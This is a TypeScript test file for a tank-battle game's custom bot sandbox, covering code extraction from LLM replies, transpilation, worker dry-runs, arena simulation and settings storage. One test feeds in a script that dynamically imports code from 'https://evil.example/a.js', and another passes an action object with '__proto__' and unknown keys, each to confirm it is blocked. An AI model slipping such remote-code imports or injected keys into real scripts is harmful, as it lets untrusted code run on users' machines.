import assert from 'node:assert/strict';
import test from 'node:test';
import {
  extractCodeFromLlmResponse,
  sanitizeBotActionIntent,
  transpileUserBotScript,
} from './scriptTranspiler';
import { validateCustomBotInWorker } from './workerSandbox';
import {
  createCustomBotId,
  exportCustomBotScriptsJson,
  loadCustomBotScripts,
  parseImportedCustomBotScriptsJson,
  saveCustomBotScripts,
  validateArenaSeatName,
  validateCustomBotName,
} from './customBotStore';
import {
  getDefaultArenaSeats,
  loadArenaSeats,
  loadGameRules,
  loadModePreferences,
  saveArenaSeats,
  saveGameRules,
  saveModePreferences,
  type StorageLike,
} from '../settings/preferencesStore';
import { tankBattleGame } from '../../games/tank-battle';
import {
  DEFAULT_TANK_BOT_TEMPLATE_CODE,
  buildTankBattlePromptMarkdown,
  tankBattleAiSdk,
} from '../../games/tank-battle/ai/aiSdk';
import { generateMaze } from '../../games/tank-battle/map/generateMaze';
import { DeterministicRng } from '../../games/tank-battle/map/rng';
import { selectSpawnPoints } from '../../games/tank-battle/map/spawnPoints';
import { TankBattleSession } from '../../games/tank-battle/simulation/world';
import type {
  BotActionIntent,
  CustomBotScriptRecord,
  InputFrame,
  PlayerConfig,
} from '../games/contracts';

function createMemoryStorage(): StorageLike {
  const map = new Map<string, string>();
  return {
    getItem: (k) => map.get(k) ?? null,
    setItem: (k, v) => {
      map.set(k, v);
    },
    removeItem: (k) => {
      map.delete(k);
    },
  };
}

test('extractCodeFromLlmResponse extracts fenced TypeScript and raw code cleanly', () => {
  const llmReply = [
    '这是一个高胜率坦克策略脚本：',
    '```typescript',
    'export function decide(obs: { tick: number }) {',
    '  return { forward: obs.tick % 2 === 0, fire: true };',
    '}',
    '```',
    '可以直接粘贴运行！',
  ].join('\n');

  const extracted = extractCodeFromLlmResponse(llmReply);
  assert.match(extracted, /export function decide/);
  assert.doesNotMatch(extracted, /这是一个高胜率/);
});

test('transpileUserBotScript compiles TS interfaces/exports and blocks runtime imports', () => {
  const tsCode = `
    interface MyState { counter?: number; }
    export function createBot(ctx: { seed: number }) {
      return {
        decide(obs: { tick: number }, state: MyState) {
          state.counter = (state.counter ?? 0) + 1;
          return { forward: true, fire: obs.tick % 3 === 0 };
        }
      };
    }
  `;
  const okRes = transpileUserBotScript(tsCode);
  assert.equal(okRes.ok, true);
  if (okRes.ok) {
    assert.ok(okRes.compiledBody.length > 20);
  }

  const badImport = `
    import axios from 'axios';
    export function decide() { return { forward: Boolean(axios) }; }
  `;
  const blocked = transpileUserBotScript(badImport);
  assert.equal(blocked.ok, false);
  if (!blocked.ok) {
    assert.match(blocked.errorMessage ?? '', /不能使用外部 import/);
  }

  const badDynamicImport = `
    export function decide() { void import('https://evil.example/a.js'); return {}; }
  `;
  assert.equal(transpileUserBotScript(badDynamicImport).ok, false);
});

test('sanitizeBotActionIntent enforces strict action whitelist', () => {
  const validIds = ['forward', 'backward', 'turnLeft', 'turnRight', 'fire'];
  const clean = sanitizeBotActionIntent(
    {
      forward: 1,
      fire: true,
      turnLeft: false,
      evilKey: true,
      __proto__: true,
    },
    validIds
  );

  assert.deepEqual(clean, {
    forward: true,
    backward: false,
    turnLeft: false,
    turnRight: false,
    fire: true,
  });
  assert.equal('evilKey' in clean, false);
});

test('validateCustomBotInWorker dry-runs DEFAULT_TANK_BOT_TEMPLATE_CODE for 120 ticks', async () => {
  const rules = tankBattleGame.getDefaultRules();
  const report = await validateCustomBotInWorker({
    rawCode: `\`\`\`ts\n${DEFAULT_TANK_BOT_TEMPLATE_CODE}\n\`\`\``,
    validActionIds: tankBattleGame.actions.map((a) => a.id),
    ticks: 120,
    seed: 123456,
    createDryRun: () => {
      const dry = tankBattleAiSdk.createDryRunWorld(rules, 123456);
      return {
        world: dry.world,
        selfSlotId: dry.selfSlotId,
        buildObservation: (w, slot, tick) => tankBattleAiSdk.buildObservation(w, slot, tick),
        stepWorld: dry.stepWorld,
      };
    },
  });

  assert.equal(report.status, 'verified');
  assert.equal(report.ticksSimulated, 120);
  assert.ok(report.actionsTriggered.length > 0);
  assert.ok(report.avgDecisionMs >= 0);

  const errorReport = await validateCustomBotInWorker({
    rawCode: 'export function decide() { throw new Error("boom"); }',
    validActionIds: tankBattleGame.actions.map((a) => a.id),
    ticks: 10,
    seed: 123456,
    createDryRun: () => {
      const dry = tankBattleAiSdk.createDryRunWorld(rules, 123456);
      return {
        world: dry.world,
        selfSlotId: dry.selfSlotId,
        buildObservation: (w, slot, tick) => tankBattleAiSdk.buildObservation(w, slot, tick),
        stepWorld: dry.stepWorld,
      };
    },
  });
  assert.equal(errorReport.status, 'error');
  assert.match(errorReport.errorMessage ?? '', /boom/);
});

test('buildTankBattlePromptMarkdown toggles live custom rules section cleanly', () => {
  const rules = {
    ...tankBattleGame.getDefaultRules(),
    gridCols: 14,
    gridRows: 9,
    targetScore: 7,
  };
  const withRules = buildTankBattlePromptMarkdown(rules, { includeCurrentRules: true });
  const withoutRules = buildTankBattlePromptMarkdown(rules, { includeCurrentRules: false });

  assert.match(withRules, /TankObservation/);
  assert.match(withRules, /14 × 9/);
  assert.match(withRules, /`7` 分/);
  assert.match(withRules, /当前对局规则参数（已附带）/);
  assert.doesNotMatch(withoutRules, /当前对局规则参数（已附带）/);
});

test('selectSpawnPoints generates unique valid spawns for 2, 4, 6, and 8 tanks', () => {
  for (const count of [2, 4, 6, 8]) {
    const cols = count >= 7 ? 14 : count >= 5 ? 12 : 10;
    const rows = count >= 7 ? 9 : count >= 5 ? 8 : 7;
    const maze = generateMaze({ cols, rows, extraPassages: 10, seed: 9000 + count });
    const rng = new DeterministicRng(4200 + count);
    const points = selectSpawnPoints(maze, count, rng);

    assert.equal(points.length, count);
    const uniqueCells = new Set(points.map((p) => p.cellIndex));
    assert.equal(uniqueCells.size, count);
    for (const pt of points) {
      assert.ok(pt.x > 0 && pt.x < maze.width);
      assert.ok(pt.y > 0 && pt.y < maze.height);
      assert.ok(Number.isFinite(pt.angle));
    }
  }
});

test('6-seat TankBattleSession runs headless multi-AI arena brawl cleanly without NaN', () => {
  const models = tankBattleGame.botModels ?? [];
  assert.ok(models.length >= 4);
  const baseRules = tankBattleGame.getDefaultRules();
  const rules = {
    ...baseRules,
    gridCols: 12,
    gridRows: 8,
    countdownSeconds: 0,
    targetScore: 2,
    roundTimeLimitSeconds: 45,
  };
  const players: PlayerConfig[] = Array.from({ length: 6 }, (_, idx) => {
    const model = models[idx % models.length];
    return {
      slotId: `p${idx + 1}`,
      rawName: `AI${idx + 1}`,
      displayName: `AI${idx + 1}`,
      colorHex: ['#D9432B', '#2364C7', '#1F8A5B', '#C98316', '#7B3FA0', '#157D8C'][idx],
      bindings: {},
      controller: 'ai',
      aiSource: 'builtin',
      aiModelId: model.id,
      aiModelName: model.name,
    };
  });

  const session = new TankBattleSession({
    gameId: 'tank-battle',
    rulesVersion: tankBattleGame.rulesVersion,
    rules,
    players,
    sessionSeed: 778899,
    gameMode: 'brawl',
  });

  const agents = players.map((p, idx) => {
    const model = models.find((m) => m.id === p.aiModelId) ?? models[0];
    return { slotId: p.slotId, agent: model.createAgent(778899 + idx * 17) };
  });

  const prevHeld: Record<string, BotActionIntent> = {};
  let totalSteps = 0;

  for (let i = 0; i < 60 * 25; i += 1) {
    const world = session.getWorldState();
    const curHeld: Record<string, BotActionIntent> = {};
    for (const { slotId, agent } of agents) {
      curHeld[slotId] = agent.decide(world, slotId, 1 / 60);
    }

    const input: InputFrame = {
      getAction: (slotId, actionId) => {
        const held = Boolean(curHeld[slotId]?.[actionId]);
        const was = Boolean(prevHeld[slotId]?.[actionId]);
        return { held, justPressed: held && !was, justReleased: !held && was };
      },
    };
    for (const slotId of Object.keys(curHeld)) {
      prevHeld[slotId] = { ...curHeld[slotId] };
    }

    const stepRes = session.step(1 / 60, input);
    totalSteps += 1;
    if (stepRes.matchResult) break;
  }

  const world = session.getWorldState();
  assert.equal(world.tanks.length, 6);
  for (const t of world.tanks) {
    assert.ok(Number.isFinite(t.x) && Number.isFinite(t.y) && Number.isFinite(t.angle));
  }
  const hud = session.getHudState();
  assert.equal(hud.players.length, 6);
  assert.ok(totalSteps > 100);
});

test('customBotStore, arenaSeats, and 3-mode rules storage persist independently', () => {
  const storage = createMemoryStorage();

  // 1. Custom bot store + JSON import/export
  assert.equal(validateCustomBotName('Gemini 雷神'), null);
  assert.notEqual(validateCustomBotName(''), null);
  assert.equal(validateArenaSeatName(''), null);
  assert.equal(validateArenaSeatName('DeepSeek-V3'), null);

  const sample: CustomBotScriptRecord = {
    id: createCustomBotId(),
    gameId: 'tank-battle',
    name: 'Gemini 雷神',
    defaultColorHex: '#1F8A5B',
    tierLabel: '大师',
    authorModel: 'Gemini 2.5 Pro',
    description: '高侵略反弹预判',
    code: DEFAULT_TANK_BOT_TEMPLATE_CODE,
    validation: {
      status: 'verified',
      checkedAt: 1000,
      ticksSimulated: 120,
      avgDecisionMs: 0.14,
      maxDecisionMs: 0.45,
      actionsTriggered: ['forward', 'fire'],
    },
    createdAt: 1000,
    updatedAt: 1000,
  };
  assert.equal(saveCustomBotScripts('tank-battle', [sample], storage).ok, true);
  const loadedScripts = loadCustomBotScripts('tank-battle', storage).value;
  assert.equal(loadedScripts.length, 1);
  assert.equal(loadedScripts[0].name, 'Gemini 雷神');

  const json = exportCustomBotScriptsJson('tank-battle', loadedScripts);
  const imported = parseImportedCustomBotScriptsJson(json, 'tank-battle');
  assert.equal(imported.ok, true);
  if (imported.ok) {
    assert.equal(imported.scripts.length, 1);
    assert.equal(imported.scripts[0].name, 'Gemini 雷神');
  }

  // 2. Arena seats persistence
  const seats = getDefaultArenaSeats(6);
  seats[0].name = 'Gemini 雷神';
  seats[0].aiSource = 'custom';
  seats[0].aiModelId = sample.id;
  assert.equal(saveArenaSeats('tank-battle', seats, storage).ok, true);
  const loadedSeats = loadArenaSeats('tank-battle', undefined, storage).value;
  assert.equal(loadedSeats.length, 6);
  assert.equal(loadedSeats[0].aiSource, 'custom');
  assert.equal(loadedSeats[0].name, 'Gemini 雷神');

  // 3. 3-mode rules isolation + mode prefs
  const defRules = tankBattleGame.getDefaultRules();
  saveGameRules('tank-battle', 1, { ...defRules, targetScore: 3 }, storage, 'single');
  saveGameRules('tank-battle', 1, { ...defRules, targetScore: 5 }, storage, 'multi');
  saveGameRules('tank-battle', 1, { ...defRules, targetScore: 9, gridCols: 14 }, storage, 'brawl');

  assert.equal(loadGameRules(tankBattleGame, storage, 'single').value.targetScore, 3);
  assert.equal(loadGameRules(tankBattleGame, storage, 'multi').value.targetScore, 5);
  assert.equal(loadGameRules(tankBattleGame, storage, 'brawl').value.targetScore, 9);
  assert.equal(loadGameRules(tankBattleGame, storage, 'brawl').value.gridCols, 14);

  saveModePreferences(
    { gameMode: 'brawl', singleMatchup: 'human_vs_ai', aiModelBySlot: { p1: 'elite', p2: `custom:${sample.id}` } },
    storage
  );
  const loadedMode = loadModePreferences('tactical', storage).value;
  assert.equal(loadedMode.gameMode, 'brawl');
  assert.equal(loadedMode.aiModelBySlot.p2, `custom:${sample.id}`);
});
